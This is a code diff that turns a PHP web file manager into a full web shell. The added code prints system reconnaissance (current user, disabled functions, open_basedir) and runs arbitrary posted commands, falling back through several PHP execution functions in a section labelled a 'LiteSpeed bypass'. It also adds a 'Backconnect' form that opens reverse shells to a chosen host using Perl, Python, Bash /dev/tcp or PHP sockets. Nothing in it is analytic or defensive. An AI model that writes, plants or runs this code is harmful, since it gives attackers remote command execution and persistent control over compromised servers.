@@ -2,6 +2,111 @@
 $currentDir = isset($_POST['d']) && !empty($_POST['d']) ? base64_decode($_POST['d']) : getcwd();
 $currentDir = str_replace("\\", "/", $currentDir);
 
+// System Information
+function getSystemInfo() {
+    $info = [];
+    $info['OS'] = php_uname('s');
+    $info['Hostname'] = php_uname('n');
+    $info['PHP Version'] = phpversion();
+    $info['Server Software'] = $_SERVER['SERVER_SOFTWARE'] ?? 'N/A';
+    $info['Current User'] = @exec('whoami');
+    $info['Disabled Functions'] = ini_get('disable_functions');
+    $info['Open Basedir'] = ini_get('open_basedir');
+    $info['Safe Mode'] = ini_get('safe_mode') ? 'On' : 'Off';
+    $info['Server IP'] = $_SERVER['SERVER_ADDR'] ?? 'N/A';
+    $info['Client IP'] = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
+    
+    return $info;
+}
+
+// Display System Info
+$systemInfo = getSystemInfo();
+echo "<div class='system-info'><h3>System Information</h3><table>";
+foreach ($systemInfo as $key => $value) {
+    echo "<tr><td><strong>$key</strong></td><td>$value</td></tr>";
+}
+echo "</table></div>";
+
+// CMD Execution with LiteSpeed bypass
+if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
+    $cmd = $_POST['cmd'];
+    echo "<div class='cmd-output'><h3>Command Output</h3><pre>";
+    
+    // Try multiple execution methods
+    if (function_exists('system')) {
+        @system($cmd);
+    } elseif (function_exists('shell_exec')) {
+        echo @shell_exec($cmd);
+    } elseif (function_exists('exec')) {
+        @exec($cmd, $output);
+        echo implode("\n", $output);
+    } elseif (function_exists('passthru')) {
+        @passthru($cmd);
+    } elseif (is_callable('proc_open')) {
+        $handle = @proc_open($cmd, [['pipe','r'],['pipe','w'],['pipe','w']], $pipes);
+        if ($handle !== false) {
+            echo stream_get_contents($pipes[1]);
+            fclose($pipes[1]);
+            proc_close($handle);
+        }
+    } elseif (function_exists('popen')) {
+        $handle = @popen($cmd, 'r');
+        if ($handle !== false) {
+            while (!feof($handle)) {
+                echo fread($handle, 4096);
+            }
+            pclose($handle);
+        }
+    } else {
+        echo "Command execution functions are disabled.";
+    }
+    
+    echo "</pre></div>";
+}
+
+// Backconnect functionality
+if (isset($_POST['backconnect'])) {
+    $host = $_POST['host'] ?? '';
+    $port = $_POST['port'] ?? '';
+    $lang = $_POST['lang'] ?? 'php';
+    
+    if (!empty($host) && !empty($port)) {
+        echo "<div class='backconnect-output'><h3>Backconnect Attempt</h3><pre>";
+        
+        switch ($lang) {
+            case 'perl':
+                $perl_code = 'use Socket;$i="'.$host.'";$p='.$port.';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};';
+                @system("perl -e '$perl_code'");
+                break;
+                
+            case 'python':
+                $python_code = 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'.$host.'",'.$port.'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);';
+                @system("python -c '$python_code'");
+                break;
+                
+            case 'bash':
+                @system("bash -i >& /dev/tcp/$host/$port 0>&1");
+                break;
+                
+            case 'php':
+            default:
+                $sock = @fsockopen($host, $port);
+                if ($sock) {
+                    fwrite($sock, "Backconnect established\n");
+                    while ($cmd = fgets($sock)) {
+                        $output = shell_exec($cmd);
+                        fwrite($sock, $output);
+                    }
+                    fclose($sock);
+                }
+                break;
+        }
+        
+        echo "</pre></div>";
+    }
+}
+
+// Original file manager code continues...
 $pathParts = explode("/", $currentDir);
 echo "<div class=\"dir\">";
 foreach ($pathParts as $k => $v) {
@@ -13,6 +118,30 @@ foreach ($pathParts as $k => $v) {
     echo "<a href=\"javascript:void(0);\" onclick=\"postDir('" . addslashes($dirPath) . "')\">$v</a>/";
 }
 echo "</div>";
+
+// CMD and Backconnect Forms
+echo "<div class='tools'>
+    <h3>Tools</h3>
+    <form method='post'>
+        <input type='text' name='cmd' placeholder='Command' required>
+        <input type='hidden' name='d' value='".base64_encode($currentDir)."'>
+        <input type='submit' value='Execute'>
+    </form>
+    
+    <form method='post'>
+        <h4>Backconnect</h4>
+        <input type='text' name='host' placeholder='Host/IP' required>
+        <input type='text' name='port' placeholder='Port' required>
+        <select name='lang'>
+            <option value='php'>PHP</option>
+            <option value='perl'>Perl</option>
+            <option value='python'>Python</option>
+            <option value='bash'>Bash</option>
+        </select>
+        <input type='hidden' name='d' value='".base64_encode($currentDir)."'>
+        <input type='submit' name='backconnect' value='Connect'>
+    </form>
+</div>";
 
 if (isset($_POST['s']) && isset($_FILES['u']) && $_FILES['u']['error'] == 0) {
     $fileName = $_FILES['u']['name'];
@@ -126,6 +255,15 @@ if (isset($_POST['ren']) && !empty($_POST['ren'])) {
         .button1 { margin: 0 5px; padding: 5px 10px; }
         .dir { margin: 10px; }
         textarea { width: 100%; height: 400px; }
+        .system-info, .cmd-output, .backconnect-output, .tools { 
+            margin: 15px; 
+            padding: 10px; 
+            border: 1px solid #ccc; 
+            background: #f9f9f9; 
+        }
+        .tools input, .tools select {
+            margin: 5px;
+        }
     </style>
     <script>
         function postDir(dir) {
@@ -186,7 +324,7 @@ if (isset($_POST['ren']) && !empty($_POST['ren'])) {
                 document.body.appendChild(form);
                 form.submit();
             }
-        }a
+        }
 
         function postOpen(path) {
             var form = document.createElement("form");
@@ -202,5 +340,4 @@ if (isset($_POST['ren']) && !empty($_POST['ren'])) {
         }
     </script>
 </head>
-
 </html>
